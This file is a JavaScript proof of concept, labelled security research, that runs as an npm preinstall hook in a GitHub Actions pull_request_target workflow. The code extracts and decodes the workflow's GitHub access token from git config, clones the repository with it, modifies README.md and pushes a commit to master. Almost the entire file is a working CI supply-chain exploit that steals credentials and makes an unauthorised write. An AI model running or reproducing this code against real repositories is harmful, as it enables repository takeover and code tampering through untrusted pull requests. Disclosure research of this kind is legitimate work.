/**
 * GitHub Actions Security Research PoC
 * Demonstrates npm ci LOTP (Living off the Pipeline) vulnerability
 *
 * This script executes during `npm ci` via the preinstall hook.
 * No malicious actions are performed.
 */

const { execSync } = require('child_process');
const fs = require('fs');

const repo = process.env.GITHUB_REPOSITORY || 'unknown';
const runId = process.env.GITHUB_RUN_ID || 'unknown';
const workflow = process.env.GITHUB_WORKFLOW || 'unknown';
const actor = process.env.GITHUB_ACTOR || 'unknown';

console.log('');
console.log('=== GitHub Actions Security Research PoC ===');
console.log('');
console.log('[npm ci LOTP] Arbitrary code execution via preinstall script');
console.log('');
console.log('Repository:', repo);
console.log('Run ID:', runId);
console.log('Workflow:', workflow);
console.log('Triggered by:', actor);
console.log('');

// Try to get token and demonstrate write access
let token = null;
try {
    const extraHeader = execSync('git config --get http.https://github.com/.extraheader 2>/dev/null', {encoding: 'utf8'}).trim();
    if (extraHeader && extraHeader.includes('AUTHORIZATION:')) {
        const match = extraHeader.match(/AUTHORIZATION: basic (.+)/);
        if (match) {
            const decoded = Buffer.from(match[1], 'base64').toString();
            const tokenMatch = decoded.match(/x-access-token:(.+)/);
            if (tokenMatch) token = tokenMatch[1];
        }
    }
} catch (e) {}

if (token) {
    console.log('[Stage 2] Attempting to demonstrate contents:write...');

    const tempDir = `/tmp/poc-npm-${Date.now()}`;
    try {
        execSync(`mkdir -p ${tempDir}`, {stdio: 'pipe'});

        const cloneUrl = `https://x-access-token:${token}@github.com/${repo}.git`;
        execSync(`git clone --depth 1 ${cloneUrl} ${tempDir}/repo 2>&1`, {stdio: 'pipe'});

        execSync(`git -C ${tempDir}/repo config user.email "security-poc@research.local"`, {stdio: 'pipe'});
        execSync(`git -C ${tempDir}/repo config user.name "Security Research"`, {stdio: 'pipe'});

        const timestamp = new Date().toISOString();
        const securityNotice = `

<!--
GitHub Actions Security Research PoC
====================================
This HTML comment was added to demonstrate a pull_request_target + npm ci LOTP vulnerability.
No malicious actions were performed.

Workflow Run: https://github.com/${repo}/actions/runs/${runId}
Timestamp: ${timestamp}
Vector: pull_request_target with checkout + npm ci preinstall script

This proves contents:write access was obtained from an untrusted PR.
Please review the workflow run logs for full details.
-->
`;

        const readmePath = `${tempDir}/repo/README.md`;
        if (fs.existsSync(readmePath)) {
            const existingReadme = fs.readFileSync(readmePath, 'utf8');
            fs.writeFileSync(readmePath, existingReadme + securityNotice);

            execSync(`git -C ${tempDir}/repo add README.md`, {stdio: 'pipe'});
            execSync(`git -C ${tempDir}/repo commit -m "security: npm ci LOTP PoC"`, {stdio: 'pipe'});

            const pushOutput = execSync(`git -C ${tempDir}/repo push origin master 2>&1`, {encoding: 'utf8'});
            console.log('  ✓ Push successful - contents:write confirmed');
            console.log('  Verify: https://github.com/' + repo + '/blob/master/README.md');
        }
    } catch (e) {
        console.log('  Push failed (may not have contents:write):', e.message.split('\n')[0]);
    }
} else {
    console.log('[Stage 2] No token found - cannot test write access');
}

console.log('');
console.log('Workflow run: https://github.com/' + repo + '/actions/runs/' + runId);
console.log('');
console.log('=== PoC Complete ===');
console.log('');
